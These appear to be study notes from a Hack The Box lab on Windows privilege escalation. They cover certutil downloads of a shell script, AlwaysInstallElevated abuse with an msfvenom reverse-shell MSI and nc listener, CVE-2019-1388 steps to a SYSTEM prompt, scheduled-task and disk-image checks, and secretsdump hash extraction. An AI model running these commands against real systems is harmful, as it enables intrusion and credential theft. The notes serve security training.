## Living Off The Land Binaries and Scripts (LOLBAS)
#### Transferring File with Certutil

```powershell
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```
#### Encoding File with Certutil

```cmd
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```
#### Decoding File with Certutil

```cmd
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```
## Always Install Elevated

- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`
![](Miscellaneous%20Techniques-20260824-162751.png)
#### Enumerating Always Install Elevated Settings

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```
#### Generating MSI Package

```shell
3kjS@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```
#### Executing MSI Package

```cmd
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```
#### Catching Shell

```shell
3kjS@htb[/htb]$ nc -lnvp 9443
```
## CVE-2019-1388

[CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges.

First right click on the `hhupd.exe` executable and select `Run as administrator` from the menu.
![](Miscellaneous%20Techniques-20260824-163026.png)

Next, click on `Show information about the publisher's certificate` to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the Details tab.
![](Miscellaneous%20Techniques-20260824-163031.png)

Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.
![](Miscellaneous%20Techniques-20260824-163035.png)

If we open `Task Manager`, we will see that the browser instance was launched as SYSTEM.
![](Miscellaneous%20Techniques-20260824-163039.png)

Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.
![](Miscellaneous%20Techniques-20260824-163136.png)

Type `c:\windows\system32\cmd.exe` in the file path and hit enter.
![](Miscellaneous%20Techniques-20260824-163154.png)
## Scheduled Tasks
#### Enumerating Scheduled Tasks

We can use the [schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) command to enumerate scheduled tasks on the system.
```cmd
C:\htb> schtasks /query /fo LIST /v
```
#### Enumerating Scheduled Tasks with PowerShell

```powershell
PS C:\htb> Get-ScheduledTask | select TaskName,State
```
#### Checking Permissions on C:\Scripts Directory

```cmd
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```
## User/Computer Description Field
#### Checking Local User Description Field

```powershell
PS C:\htb> Get-LocalUser
```
#### Enumerating Computer Description Field with Get-WmiObject Cmdlet

```powershell
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
 
Description
-----------
The most vulnerable box ever!
```
## Mount VHDX/VMDK
#### Mount VMDK on Linux

```shell
3kjS@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```
#### Mount VHD/VHDX on Linux

```shell
3kjS@htb[/htb]$ guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
```
![](Miscellaneous%20Techniques-20260824-163922.png)
#### Retrieving Hashes using Secretsdump.py

```shell
3kjS@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
